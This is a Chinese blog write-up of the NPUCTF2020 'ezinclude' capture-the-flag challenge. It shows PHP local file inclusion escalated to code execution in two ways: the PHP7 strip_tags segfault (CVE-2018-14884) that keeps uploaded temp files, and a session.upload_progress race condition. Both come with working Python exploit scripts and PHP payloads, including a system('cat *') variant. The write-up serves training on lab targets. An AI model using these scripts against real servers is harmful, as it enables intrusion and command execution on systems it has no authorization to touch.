---
title: '[NPUCTF2020]ezinclude'
date: 2024-06-16 14:09:59
tags: php特性
categories: 刷题笔记
---

### [NPUCTF2020]ezinclude（php7 segment fault特性）

我们打开源码，发现页面有个提示

![image-20240616141533744](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406161415869.png)

```
md5($secret.$name)===$pass
```

我们输入url

```
/?name=1
```

变化name的值，发现cookies的hash在不断变化，说明hash的值跟name的取值有关，但又不完全是name的值，说明cookie的hash很有可能就是md5的值

<!--more-->

我们传入

```
?name=1&pass=576322dd496b99d07b5b0f7fa7934a25
```

但传入后跳转到404.html页面，跳转之前好像还有一个页面一闪而过，我们抓包看看

![image-20240616143019249](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406161430438.png)

我们发现页面跳转到了flflflflag.php，我们再次进行抓包

![image-20240616143114151](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406161431336.png)

发现了一串代码，可知我们需要用到文件包含

```
?file=php://filter/convert.base64-encode/resource=flflflflag.php
```

![image-20240616143233149](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406161432334.png)

我们得到了一串base64加密的字符串，进行解密看看

```
<html>
<head>
<script language="javascript" type="text/javascript">
           window.location.href="404.html";
</script>
<title>this_is_not_fl4g_and_出题人_wants_girlfriend</title>
</head>
<>
<body>
<?php
$file=$_GET['file'];
if(preg_match('/data|input|zip/is',$file)){
	die('nonono');
}
@include($file);
echo 'include($_GET["file"])';
?>
</body>
</html>

```

嗯，多了一个不知道有啥用的代码

我们进行目录扫描

```
python dirsearch.py -u http://b75582fa-5dab-4f76-8734-1c591cb88d31.node4.buuoj.cn:81/ -e * --timeout=2 -t 1 -x 400,403,404,500,503,429 -w db/dict_mode_dict.txt

```

扫到了dir.php，我们抓包利用文件包含查看源码

```
<?php
var_dump(scandir('/tmp'));
?>

```

dir.php能打印临时文件夹里的内容，因此我们要想办法把文件存到tmp文件夹中。



#### 方法一 利用php7 segment fault特性（CVE-2018-14884）

php代码中使用php://filter的 strip_tags 过滤器, 可以让 php 执行的时候直接出现 Segment Fault , 这样 php 的垃圾回收机制就不会在继续执行 , 导致 POST 的文件会保存在系统的缓存目录下不会被清除而不像phpinfo那样上传的文件很快就会被删除，这样的情况下我们只需要知道其文件名就可以包含我们的恶意代码。

使用php://filter/string.strip_tags导致php崩溃清空堆栈重启，如果在同时上传了一个文件，那么这个tmp file就会一直留在tmp目录，知道文件名就可以getshell。这个崩溃原因是存在一处空指针引用。向PHP发送含有文件区块的数据包时，让PHP异常崩溃退出，POST的临时文件就会被保留，临时文件会被保存在upload_tmp_dir所指定的目录下，默认为tmp文件夹。

该方法仅适用于以下php7版本，php5并不存在该崩溃。

利用条件：

- php7.0.0-7.1.2可以利用， 7.1.2x版本的已被修复
- php7.1.3-7.2.1可以利用， 7.2.1x版本的已被修复
- php7.2.2-7.2.8可以利用， 7.2.9一直到7.3到现在的版本已被修复
- 可以获取文件名
- 源代码将GET参数进行文件包含

[[NPUCTF2020\]ezinclude（PHP临时文件包含） - 「配枪朱丽叶。」](https://www.shawroot.cc/1159.html)

[PHP LFI 利用临时文件 Getshell 姿势](https://www.codenong.com/cs106498971/)

可以利用url

```
/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd

```

现在开始利用上面的url，编写python脚本，直接通过上传的文件名访问phpinfo()：

```
import requests
from io import BytesIO
payload = "<?php phpinfo()?>"
file_data = { 'file': BytesIO(payload.encode()) }
url = "http://b75582fa-5dab-4f76-8734-1c591cb88d31.node4.buuoj.cn:81/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd"
r = requests.post(url=url, files=file_data, allow_redirects=False)

```

运行脚本后访问/dir.php，得到tmp目录下刚刚我们上传的文件路径：/tmp/phpqMe1db 

然后抓包发送请求

![image-20240616150731738](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202406161507841.png)

得到flag

[LFItoRCE利用总结](https://bbs.zkaq.cn/t/3639.html)



#### 方法二 利用 [session](https://so.csdn.net/so/search?q=session&spm=1001.2101.3001.7020).upload_progress 进行 session 文件包含

原理：利用session.upload_progress上传一个临时文件，该文件里面有我们上传的恶意代码，然后包含它，从而执行里面的代码。因为该文件内容清空很快，所以需要不停的上传和包含，在清空之前包含该文件。

session中一部分数据(session.upload_progress.name)是用户自己可以控制的。那么我们只要上传文件的时候，在Cookie中设置PHPSESSID=yym68686（默认情况下session.use_strict_mode=0用户可以自定义Session ID），同时POST一个恶意的字段PHP_SESSION_UPLOAD_PROGRESS ，（PHP_SESSION_UPLOAD_PROGRESS在session.upload_progress.name中定义），只要上传包里带上这个键，PHP就会自动启用Session，同时，我们在Cookie中设置了PHPSESSID=yym68686，所以Session文件将会自动创建。

因为session.upload_progress.cleanup = on这个默认选项会有限制，当文件上传结束后，php将会立即清空对应session文件中的内容，这就导致我们在包含该session的时候相当于在包含一个空文件，没有包含我们传入的恶意代码。不过，我们只需要条件竞争，赶在文件被清除前利用即可。

编写脚本：

```
import io
import re
import sys
import requests
import threading

host = 'http://003ae9af-2700-4283-99e8-da47b33de836.node4.buuoj.cn:81/flflflflag.php'
sessid = 'yym68686'

def POST(session):
    while True:
        f = io.BytesIO(b'a' * 1024 * 50)
        session.post(
            host,
            data={"PHP_SESSION_UPLOAD_PROGRESS":"<?php phpinfo();?>"},
            files={"file":('a.txt', f)},
            cookies={'PHPSESSID':sessid}
        )

def READ(session):
    while True:
        response = session.get(f'{host}?file=/tmp/sess_{sessid}')
        if 'flag{' not in response.text:
            print('\rWaiting...', end="")
        else:
            print("\r" + re.search(r'flag{(.*?)}', response.text).group(0))
            sys.exit(0)

with requests.session() as session:
    t1 = threading.Thread(target=POST, args=(session, ))
    t1.daemon = True
    t1.start()
    READ(session)

```

这个脚本的前提是必须知道flag在phpinfo里面，所以局限性比较大。把<?php phpinfo();?>换成<?php system('cat *');?>也可以，输出的依然是phpinfo()的内容。

[[NPUCTF2020\]ezinclude](https://www.icode9.com/content-4-886902.html)

[利用session.upload_progress进行文件包含和反序列化渗透 - FreeBuf网络安全行业门户](https://www.freebuf.com/vuls/202819.html)

[利用session.upload_progress进行文件包含_天问_Herbert555的博客-CSDN博客](https://blog.csdn.net/qq_44657899/article/details/109281343)

[LFI 绕过 Session 包含限制 Getshell](https://www.anquanke.com/post/id/201177#h3-17)
